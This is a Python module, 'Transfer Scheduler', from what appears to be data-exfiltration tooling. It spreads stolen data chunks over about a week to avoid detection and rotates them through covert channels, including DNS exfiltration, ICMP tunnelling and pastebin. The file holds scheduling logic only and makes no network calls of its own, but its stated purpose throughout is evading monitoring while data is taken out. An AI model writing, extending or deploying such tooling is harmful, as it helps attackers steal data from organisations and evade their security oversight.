#!/usr/bin/env python3
"""
Transfer Scheduler
Schedules chunk transfers over time to avoid detection
"""

from datetime import datetime, timedelta
from typing import List, Dict
from dataclasses import dataclass


@dataclass
class TransferJob:
    """Represents a scheduled transfer job"""
    chunk_id: str
    chunk_path: str
    scheduled_time: datetime
    channel: str
    status: str = "pending"  # pending, in_progress, complete, failed
    retry_count: int = 0


class TransferScheduler:
    """
    Schedules transfers over time period
    Avoids detection by spreading transfers
    """
    
    def __init__(self, schedule_hours: int = 168):
        """
        Initialize scheduler
        
        Args:
            schedule_hours: Total hours to spread transfers over
        """
        self.schedule_hours = schedule_hours
        self.jobs = []
        self.available_channels = [
            "https_upload",
            "rt_dns_exfil",
            "cloud_storage",
            "pastebin",
            "icmp_tunnel"
        ]
    
    def schedule_chunks(self, chunks: List, start_time: datetime = None) -> List[TransferJob]:
        """
        Schedule chunks for transfer
        
        Args:
            chunks: List of chunks to schedule
            start_time: Transfer start time (default: now)
            
        Returns:
            List of TransferJob objects
        """
        if start_time is None:
            start_time = datetime.now()
        
        total_chunks = len(chunks)
        
        if total_chunks == 0:
            return []
        
        # Calculate interval between transfers
        interval_minutes = (self.schedule_hours * 60) // total_chunks
        
        scheduled_jobs = []
        
        for i, chunk in enumerate(chunks):
            # Calculate transfer time
            transfer_time = start_time + timedelta(minutes=i * interval_minutes)
            
            # Select channel (rotate through available channels)
            channel = self._select_channel(i)
            
            # Create job
            job = TransferJob(
                chunk_id=f"chunk_{i}",
                chunk_path=str(chunk.chunk_path) if hasattr(chunk, 'chunk_path') else str(chunk),
                scheduled_time=transfer_time,
                channel=channel
            )
            
            scheduled_jobs.append(job)
            self.jobs.append(job)
        
        return scheduled_jobs
    
    def _select_channel(self, index: int) -> str:
        """
        Select exfiltration channel
        Rotates through available channels
        
        Args:
            index: Chunk index
            
        Returns:
            Channel name
        """
        return self.available_channels[index % len(self.available_channels)]
    
    def get_pending_jobs(self) -> List[TransferJob]:
        """Get all pending transfer jobs"""
        return [job for job in self.jobs if job.status == "pending"]
    
    def get_due_jobs(self, current_time: datetime = None) -> List[TransferJob]:
        """
        Get jobs that are due for transfer
        
        Args:
            current_time: Current time (default: now)
            
        Returns:
            List of due jobs
        """
        if current_time is None:
            current_time = datetime.now()
        
        return [
            job for job in self.jobs 
            if job.status == "pending" and job.scheduled_time <= current_time
        ]
    
    def update_job_status(self, chunk_id: str, status: str) -> None:
        """
        Update job status
        
        Args:
            chunk_id: Chunk identifier
            status: New status
        """
        for job in self.jobs:
            if job.chunk_id == chunk_id:
                job.status = status
                break
    
    def get_schedule_summary(self) -> Dict:
        """Get schedule summary"""
        return {
            'total_jobs': len(self.jobs),
            'schedule_hours': self.schedule_hours,
            'pending': len([j for j in self.jobs if j.status == "pending"]),
            'in_progress': len([j for j in self.jobs if j.status == "in_progress"]),
            'complete': len([j for j in self.jobs if j.status == "complete"]),
            'failed': len([j for j in self.jobs if j.status == "failed"]),
            'channels_used': list(set(job.channel for job in self.jobs)),
            'start_time': min(job.scheduled_time for job in self.jobs).isoformat() if self.jobs else None,
            'end_time': max(job.scheduled_time for job in self.jobs).isoformat() if self.jobs else None
        }
    
    def generate_timeline(self) -> List[Dict]:
        """Generate transfer timeline"""
        timeline = []
        
        for job in sorted(self.jobs, key=lambda x: x.scheduled_time):
            timeline.append({
                'chunk_id': job.chunk_id,
                'scheduled_time': job.scheduled_time.isoformat(),
                'channel': job.channel,
                'status': job.status
            })
        
        return timeline
